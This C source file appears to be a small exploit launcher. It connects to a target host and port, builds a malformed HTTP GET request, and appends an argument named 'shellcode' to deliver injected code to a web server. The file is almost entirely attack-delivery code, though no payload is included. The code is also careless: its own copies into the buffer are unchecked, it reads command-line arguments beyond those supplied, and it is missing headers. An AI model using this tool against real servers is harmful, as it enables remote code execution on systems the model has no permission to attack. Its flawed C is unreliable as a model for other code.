#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define BUFFER_SIZE 4096

const char default_header[] = " HTTP/1.1\t\n\n";

int main(int argc, char *argv[]) {

    int sockfd, portno, n;
    struct sockaddr_in serv_addr;
    char *serv_host_addr, *page = NULL, *shellcode = NULL;

    if (argc < 3) {
        printf("Host address or port number is missing.\n");
        exit(0);
    }

    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if (sockfd < 0) {
        printf("Can't open stream socket.\n");
        exit(1);
    }

    serv_host_addr = argv[1];
    portno = atoi(argv[2]);
    if (argv[3] != NULL)
        page = argv[3];
    if (argv[4] != NULL)
        shellcode = argv[4];
    bzero((char *) &serv_addr,sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr(serv_host_addr);
    serv_addr.sin_port = htons(portno);
    if (connect(sockfd,(struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
        printf("Cannot connect to server.\n");
        exit(1);
    }

    char buffer[BUFFER_SIZE];

    memset(buffer, '\0', sizeof(buffer));
    memcpy(buffer, "GET /", 5);
    if (page != NULL) {
        memcpy(buffer + 5, page, strlen(page));
        memcpy(buffer + 5 + strlen(page), default_header, sizeof(default_header)/sizeof(char));
        if (shellcode != NULL) {
            memcpy(buffer + 5 + strlen(page) + sizeof(default_header)/sizeof(char), shellcode, strlen(shellcode));
        }
    } else {
        memcpy(buffer + 5, default_header, sizeof(default_header)/sizeof(char));
        if (shellcode != NULL) {
            memcpy(buffer + 5 + sizeof(default_header)/sizeof(char), shellcode, strlen(shellcode));
        }
    }

    /*int i;
    for (i = 0; i < 2048; i++)
      printf("%c", buffer[i]);
    printf("\n");*/

    n = write(sockfd, buffer, sizeof(buffer)/sizeof(char));
    printf("Write status: %d\n", n);
    if (n < 0) {
        printf("Write error.\n");
        exit(1);
    }

    bzero(buffer, BUFFER_SIZE);
    n = read(sockfd, buffer, BUFFER_SIZE - 1);
    printf("Read status: %d\n", n);
    if (n < 0) {
        printf("Read error.\n");
        exit(1);
    }

    printf("\n%s\n", buffer);

    return 0;
}